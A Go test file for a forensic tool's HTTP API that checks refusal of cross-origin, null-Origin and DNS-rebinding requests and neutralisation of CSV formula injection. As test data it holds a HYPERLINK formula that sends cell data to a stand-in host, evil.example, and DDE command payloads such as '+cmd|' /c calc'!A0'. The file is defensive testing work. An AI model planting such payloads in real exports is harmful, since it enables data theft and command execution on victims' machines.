package api

import (
	"bytes"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"tracefall/internal/model"
)

// These tests use the RAW router, not dashboardLike, so they exercise the
// real request-source checks. The attack shapes come from a hostile web page
// (cross-origin POST, DNS rebinding) and from a non-browser client.

func rawNoAuthRouter(t *testing.T) http.Handler {
	t.Helper()
	logger := slog.New(slog.NewTextHandler(bytes.NewBuffer(nil), nil))
	return NewRouter(newTestService(t), logger, testMaxUploadBytes, false)
}

func rawAuthRouter(t *testing.T) http.Handler {
	t.Helper()
	logger := slog.New(slog.NewTextHandler(bytes.NewBuffer(nil), nil))
	return NewRouterWithAuth(newTestService(t), logger, testMaxUploadBytes, false,
		AuthConfig{Enabled: true, SessionTTL: time.Hour})
}

type srcCase struct {
	name    string
	method  string
	path    string
	host    string            // Host header; "" keeps the httptest default
	headers map[string]string // extra headers
	body    string
	status  int
	refused bool // expect the request-source refusal (403 "request refused")
}

func runSrcCases(t *testing.T, mux http.Handler, cases []srcCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(tc.method, tc.path, strings.NewReader(tc.body))
			if tc.host != "" {
				req.Host = tc.host
			}
			for k, v := range tc.headers {
				req.Header.Set(k, v)
			}
			rec := httptest.NewRecorder()
			mux.ServeHTTP(rec, req)
			if rec.Code != tc.status {
				t.Fatalf("status = %d, want %d; body=%s", rec.Code, tc.status, rec.Body.String())
			}
			refused := strings.Contains(rec.Body.String(), "request refused")
			if refused != tc.refused {
				t.Fatalf("refused = %v, want %v; body=%s", refused, tc.refused, rec.Body.String())
			}
		})
	}
}

const createBody = `{"name":"src-check","description":"x"}`

// No-auth mode is the default (127.0.0.1, no session). It has no CSRF token,
// so the Origin, Host and client-header rules are the only protection.
func TestRequestSource_NoAuthMode(t *testing.T) {
	mux := rawNoAuthRouter(t)
	own := map[string]string{"Origin": "http://127.0.0.1:8080", "X-Tracefall-Client": "dashboard"}
	runSrcCases(t, mux, []srcCase{
		{name: "loopback GET is allowed", method: "GET", path: "/api/cases", host: "127.0.0.1:8080", status: 200},
		{name: "localhost GET is allowed", method: "GET", path: "/api/cases", host: "localhost:8080", status: 200},
		{name: "DNS rebinding GET is refused", method: "GET", path: "/api/cases", host: "attacker.example", status: 403, refused: true},
		{name: "DNS rebinding POST is refused", method: "POST", path: "/api/cases", host: "attacker.example",
			headers: map[string]string{"X-Tracefall-Client": "dashboard"}, body: createBody, status: 403, refused: true},
		{name: "same-origin dashboard write is allowed", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: own, body: createBody, status: 201},
		{name: "cross-origin text/plain POST is refused", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "https://evil.example", "Content-Type": "text/plain"},
			body:    createBody, status: 403, refused: true},
		{name: "cross-origin POST with a forged client header is refused", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "https://evil.example", "X-Tracefall-Client": "dashboard"},
			body:    createBody, status: 403, refused: true},
		{name: "null Origin is refused", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "null", "X-Tracefall-Client": "dashboard"}, body: createBody, status: 403, refused: true},
		{name: "cross-site Sec-Fetch-Site is refused", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Sec-Fetch-Site": "cross-site", "X-Tracefall-Client": "dashboard"},
			body:    createBody, status: 403, refused: true},
		{name: "write without Origin or client header is refused", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			body: createBody, status: 403, refused: true},
		{name: "CLI write with client header and no Origin is allowed", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"X-Tracefall-Client": "cli"}, body: `{"name":"cli-check"}`, status: 201},
	})
}

// Auth mode keeps its own CSRF token. The request-source checks still apply
// to every write, but the Host check is not applied: a rebound hostname
// cannot carry the session cookie, so the request reaches authentication and
// fails there (401), not at the source check.
func TestRequestSource_AuthMode(t *testing.T) {
	mux := rawAuthRouter(t)
	runSrcCases(t, mux, []srcCase{
		{name: "foreign Origin write is refused before auth", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "https://evil.example", "X-Tracefall-Client": "dashboard"},
			body:    createBody, status: 403, refused: true},
		{name: "write without client header is refused before auth", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "http://127.0.0.1:8080"}, body: createBody, status: 403, refused: true},
		{name: "same-origin write passes source checks and hits auth", method: "POST", path: "/api/cases", host: "127.0.0.1:8080",
			headers: map[string]string{"Origin": "http://127.0.0.1:8080", "X-Tracefall-Client": "dashboard"},
			body:    createBody, status: 401},
		{name: "rebound hostname is not refused by the source check", method: "GET", path: "/api/cases", host: "attacker.example",
			status: 401},
	})
}

func TestIsLoopbackHostHeader(t *testing.T) {
	for host, want := range map[string]bool{
		"127.0.0.1":             true,
		"127.0.0.1:8080":        true,
		"localhost":             true,
		"LOCALHOST:9":           true,
		"[::1]":                 true,
		"[::1]:8080":            true,
		"::1":                   true,
		"attacker.example":      false,
		"attacker.example:80":   false,
		"127.0.0.1.nip.io":      false,
		"localhost.attacker.io": false,
		"":                      false,
	} {
		if got := isLoopbackHostHeader(host); got != want {
			t.Errorf("isLoopbackHostHeader(%q) = %v, want %v", host, got, want)
		}
	}
}

// Evidence fields are attacker-controlled. A cell that a spreadsheet would
// evaluate as a formula must reach the CSV with a leading quote.
func TestCSVExport_NeutralisesFormulaInjection(t *testing.T) {
	payload := `=HYPERLINK("http://evil.example/?"&A1,"open")`
	events := []model.Event{{
		Timestamp:   time.Date(2026, 10, 18, 1, 0, 0, 0, time.UTC),
		EventType:   "process_create",
		ProcessName: "+cmd|' /c calc'!A0",
		CommandLine: "-enc aGk=",
		FilePath:    payload,
	}}
	var buf bytes.Buffer
	if err := writeTimelineCSV(events, &buf); err != nil {
		t.Fatalf("writeTimelineCSV: %v", err)
	}
	out := buf.String()
	if strings.Contains(out, ",=HYPERLINK") || strings.Contains(out, ",\"=HYPERLINK") {
		t.Fatalf("timeline CSV contains an unquoted formula cell:\n%s", out)
	}
	if !strings.Contains(out, "'="+"HYPERLINK") {
		t.Errorf("timeline CSV does not neutralise the formula cell:\n%s", out)
	}
	if !strings.Contains(out, "'+cmd") {
		t.Errorf("timeline CSV does not neutralise the process name:\n%s", out)
	}
	if !strings.Contains(out, "'-enc aGk=") {
		t.Errorf("timeline CSV does not neutralise the command line:\n%s", out)
	}

	findings := []model.Finding{{
		ID: "f1", RuleID: "r1", Title: "@SUM(1+1)",
		Severity: "high", Confidence: "medium", Description: "ok",
		FirstSeen: time.Date(2026, 10, 18, 1, 0, 0, 0, time.UTC),
		LastSeen:  time.Date(2026, 10, 18, 1, 0, 0, 0, time.UTC),
	}}
	statuses := map[string]model.AnalystStatus{"f1": {Status: model.ReviewNew, Note: "=cmd|' /C calc'!A0"}}
	buf.Reset()
	if err := writeFindingsCSV(findings, statuses, &buf); err != nil {
		t.Fatalf("writeFindingsCSV: %v", err)
	}
	out = buf.String()
	if !strings.Contains(out, "'@SUM") {
		t.Errorf("findings CSV does not neutralise the title:\n%s", out)
	}
	if !strings.Contains(out, "'=cmd") {
		t.Errorf("findings CSV does not neutralise the analyst note:\n%s", out)
	}
}

func TestCSVSafeRow_LeavesOrdinaryValuesAlone(t *testing.T) {
	in := []string{"2026-10-18T01:00:00Z", "svchost.exe", "", "C:\\Windows\\system32\\x.exe", "4"}
	got := csvSafeRow(in)
	for i := range in {
		if got[i] != in[i] {
			t.Errorf("cell %d changed: %q -> %q", i, in[i], got[i])
		}
	}
}
